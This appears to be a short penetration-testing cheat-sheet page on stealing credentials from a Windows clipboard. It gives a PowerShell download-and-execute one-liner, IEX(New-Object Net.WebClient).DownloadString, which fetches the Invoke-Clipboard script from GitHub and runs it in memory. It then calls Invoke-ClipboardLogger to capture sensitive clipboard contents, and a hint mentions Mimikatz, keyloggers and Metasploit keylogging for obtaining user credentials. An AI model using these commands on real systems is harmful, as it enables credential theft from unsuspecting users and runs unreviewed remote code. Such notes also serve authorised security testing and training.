# Clipboard

### <mark style="color:green;">Clipboard</mark>

&#x20;[Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1)

<mark style="color:green;">**Monitor the Clipboard with PowerShell**</mark>

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

<mark style="color:green;">**Capture Credentials from the Clipboard with Invoke-ClipboardLogger**</mark>

```powershell-session
Invoke-ClipboardLogger
```

{% hint style="info" %}
Note: User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.
{% endhint %}
